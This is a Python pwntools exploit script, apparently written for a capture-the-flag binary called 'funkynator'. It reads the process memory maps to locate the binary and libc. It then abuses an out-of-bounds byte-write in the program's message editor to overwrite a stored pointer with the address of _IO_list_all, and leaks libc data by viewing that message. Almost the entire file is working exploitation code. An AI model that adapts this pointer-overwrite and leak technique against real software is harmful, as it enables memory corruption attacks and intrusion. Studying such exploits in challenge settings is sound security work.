#!/usr/bin/env python3
"""Overwrite the memory array to point to libc data, then view it."""
from pwn import *
import struct, time
from pathlib import Path

context.arch = 'amd64'
context.log_level = 'info'

CHALLENGE_DIR = Path(__file__).parent / 'challenge' / 'challenge'
BINARY = str(CHALLENGE_DIR.resolve() / 'funkynator')
env = {'LD_LIBRARY_PATH': str(CHALLENGE_DIR.resolve() / 'glibc')}

r = process(BINARY, env=env, cwd=str(CHALLENGE_DIR))
r.recvuntil(b'name?')
r.sendline(b'TEST')
r.recvuntil(b'> ')

# Create 2 messages
r.sendline(b'2')
r.recvuntil(b'length')
r.recvline()
r.sendline(b'5')
r.recvuntil(b'message:')
r.sendline(b'AAAAA')
r.recvuntil(b'?')
r.sendline(b'n')
r.recvuntil(b'?')
r.sendline(b'y')
r.recvuntil(b'location')
r.recvline()
r.recvuntil(b'> ')

r.sendline(b'2')
r.recvuntil(b'length')
r.recvline()
r.sendline(b'16')
r.recvuntil(b'message:')
r.sendline(b'0xdeadbeefcafe00')
r.recvuntil(b'?')
r.sendline(b'n')
r.recvuntil(b'?')
r.sendline(b'y')
r.recvuntil(b'location')
r.recvline()
r.recvuntil(b'> ')

pid = r.pid
with open(f'/proc/{pid}/maps') as f:
    maps = f.read()
binary_base = libc_base = None
for l in maps.split('\n'):
    p = l.strip().split()
    if len(p) < 5: continue
    if 'funkynator' in p[-1] and p[1] == 'r--p' and p[2] == '00000000':
        binary_base = int(p[0].split('-')[0], 16)
    if 'libc.so.6' in p[-1] and p[1] == 'r--p' and p[2] == '00000000':
        libc_base = int(p[0].split('-')[0], 16)
        break

with open(f'/proc/{pid}/mem', 'rb') as f:
    f.seek(binary_base + 0x4060)
    arr = f.read(8 * 10)  # 10 pointers
    mem_slot1 = struct.unpack('<Q', arr[0:8])[0]
    mem_slot2 = struct.unpack('<Q', arr[8:16])[0]

log.info(f"binary={binary_base:#x} libc={libc_base:#x}")
log.info(f"memory array at {binary_base + 0x4060:#x}")
log.info(f"slot 1 = {mem_slot1:#x}")
log.info(f"slot 2 = {mem_slot2:#x}")

# Slot 3 is empty (0)
# Let's OVERWRITE slot 1's pointer to point to _IO_list_all
# Then view slot 1 to leak data

# Compute offset from msg2 (slot 2) to the memory array entry for slot 1
mem_arr_slot1 = binary_base + 0x4060  # slot 0 (index 0)
mem_arr_slot1_ptr = binary_base + 0x4060  # address of memory[0]

# Wait, the slot numbers in the binary are 1-based. memory[0] = slot 1, memory[1] = slot 2
# slot 1's pointer is at binary_base + 0x4060 + 0*8 = binary_base + 0x4060

# We want to overwrite memory[0] (slot 1's pointer) to libc_base + 0x1e84c0 (_IO_list_all)
target_ptr = libc_base + 0x1e84c0  # _IO_list_all address

# msg2 is the second message content pointer (slot 2)
# The memory array stores slot 2's pointer at binary_base + 0x4060 + 8
# We need to write to binary_base + 0x4060 (slot 1's pointer)

off_to_slot1 = (mem_arr_slot1 - mem_slot2) & 0xFFFFFFFFFFFFFFFF
log.info(f"Offset from slot2 content to memory[0]: {off_to_slot1:#x}")

# Now enter the editor for slot 2 and overwrite memory[0] with _IO_list_all address
target_bytes = struct.pack('<Q', target_ptr)

r.sendline(b'5')
r.recvuntil(b'id')
r.recvline()
r.sendline(b'2')
r.recvuntil(b'> ')

log.info("Overwriting memory[0]...")
for i, bval in enumerate(target_bytes):
    r.sendline(b'3')
    r.recvuntil(b'offset')
    r.recvline()
    r.sendline(str((off_to_slot1 + i) & 0xFFFFFFFFFFFFFFFF).encode())
    r.recvuntil(b'with what')
    r.recvline()
    r.send(bytes([bval]) + b'\n')
    r.recvuntil(b'> ')

log.info("Done overwriting memory[0]. Exiting editor...")
r.sendline(b'1')
r.recvuntil(b'?')
r.sendline(b'y')
r.recvuntil(b'location')
r.recvline()
r.recvuntil(b'> ')

# Now view slot 1 - it should print the content at _IO_list_all
log.info("Viewing slot 1 (should show leaked data)...")
r.sendline(b'3')
r.recvuntil(b'id')
r.recvline()
r.sendline(b'1')

data = r.recvuntil(b'> ', timeout=5)
log.info(f"View output: {data[:200]}")

# Parse the leaked data (view prints: content + \n + menu)
# The leaked pointer should be at the start
leak_line = data.split(b'\n')[0]
log.info(f"Leak line: {leak_line}")
if len(leak_line) >= 6:
    # The content might be funkified, but raw bytes should be mostly preserved
    leaked_ptr = struct.unpack('<Q', leak_line[:8].ljust(8, b'\x00'))[0]
    log.info(f"Leaked value (first 8 bytes): {leaked_ptr:#x}")

r.close()
